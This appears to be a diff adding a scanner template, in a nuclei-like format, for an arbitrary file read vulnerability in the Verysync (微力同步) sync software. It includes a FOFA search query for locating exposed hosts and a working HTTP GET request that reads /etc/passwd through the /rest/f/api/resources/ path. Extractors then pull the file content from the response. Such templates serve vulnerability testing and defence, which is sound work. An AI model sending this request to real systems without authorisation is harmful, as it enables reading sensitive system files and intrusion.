@@ -1,0 +1,25 @@
+## id: VEID-2026-11111
+## name: 微力同步-Verysync任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2026
+## description: Verysync任意文件读取漏洞,攻击者可进行任意文件读取,从而获得敏感信息。
+## affects: 微力同步-Verysync
+## fofa-query: body="Verysync"
+## verification: true
+
+
+
+GET /rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#> extract: name=path, from=body, json=$.path
+#> extract: name=content, from=body, json=$.content
+#@ matcher: status_code == 200
+
+
+
+# @VEIL-STAMP: 7ebf9ab42dd1ab47becacd2a60ee057d1924a60a6e2cc5e842075e09f75a0ca7
